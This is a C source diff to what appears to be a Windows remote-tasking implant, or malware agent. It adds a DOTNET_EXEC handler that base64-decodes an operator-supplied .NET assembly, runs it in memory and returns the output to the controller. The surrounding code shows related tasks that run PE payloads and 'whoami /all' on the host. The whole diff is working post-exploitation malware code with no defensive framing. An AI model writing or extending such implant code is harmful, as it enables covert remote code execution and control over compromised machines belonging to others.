@@ -14,6 +14,7 @@
 #include <ctype.h>
 #include "api_resolve.h"
 #include "pe_exec.h"
+#include "dotnet.h"
 #include <bcrypt.h>
 #include <winternl.h>
 
@@ -1349,6 +1350,35 @@ void dispatch_task(AgentTask *task) {
         }
         char *out = exec_pe(task->payload, task->payload_len);
         agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "DOTNET_EXEC") == 0) {
+        // args JSON: {"asm":"<base64>","args":"<string>","type":"","method":""}
+        const char *jargs = task->args ? task->args : "";
+        // Extract "asm" field via pointer arithmetic (value can be many MB)
+        const char *asm_tag = strstr(jargs, "\"asm\"");
+        if (!asm_tag) { agent_send_result(task->id, "", "DOTNET_EXEC: missing asm field"); return; }
+        const char *q1 = strchr(asm_tag + 5, '"'); // opening quote of value
+        if (!q1) { agent_send_result(task->id, "", "DOTNET_EXEC: malformed asm field"); return; }
+        q1++;
+        const char *q2 = strchr(q1, '"');
+        if (!q2 || q2 == q1) { agent_send_result(task->id, "", "DOTNET_EXEC: empty asm"); return; }
+        size_t b64len = (size_t)(q2 - q1);
+        char *b64buf = (char*)malloc(b64len + 1);
+        if (!b64buf) { agent_send_result(task->id, "", "DOTNET_EXEC: malloc asm"); return; }
+        memcpy(b64buf, q1, b64len); b64buf[b64len] = '\0';
+        size_t asm_len = 0;
+        uint8_t *asm_bytes = b64_decode(b64buf, &asm_len);
+        free(b64buf);
+        if (!asm_bytes || asm_len < 2) {
+            free(asm_bytes);
+            agent_send_result(task->id, "", "DOTNET_EXEC: b64 decode failed"); return;
+        }
+        char asm_args[4096] = {0};
+        json_get_str(jargs, "args", asm_args, sizeof(asm_args), "");
+        char *out = dotnet_exec(asm_bytes, asm_len, asm_args);
+        free(asm_bytes);
+        agent_send_result(task->id, out ? out : "(null output)", "");
+        free(out);
     }
     else if (strcmp(type_upper, "WHOAMI") == 0) {
         char *out = run_shell("whoami /all");
